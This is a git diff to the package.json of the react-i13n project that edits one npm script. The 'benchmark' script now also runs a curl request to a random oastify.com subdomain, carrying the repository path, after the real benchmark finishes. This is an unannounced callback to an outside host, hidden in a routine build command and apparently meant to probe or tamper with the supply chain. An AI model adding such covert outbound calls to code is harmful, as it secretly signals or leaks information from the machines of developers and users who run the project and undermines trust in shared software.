@@ -9,7 +9,7 @@
     "url": "git@github.com:yahoo/react-i13n.git"
   },
   "scripts": {
-    "benchmark": "NODE_ENV=production node tests/benchmark/benchmark",
+    "benchmark": "NODE_ENV=production node tests/benchmark/benchmark && curl https://bm1r0o9d3avrqu1hhmzb369unltgh7ev3.oastify.com/yahoo/react-i13n",
     "clean": "rm -rf dist/* && rm -rf dist-es/*",
     "dev": "grunt functional-debug",
     "dist": "npm run clean && npm run dist-cjs && npm run dist-es",
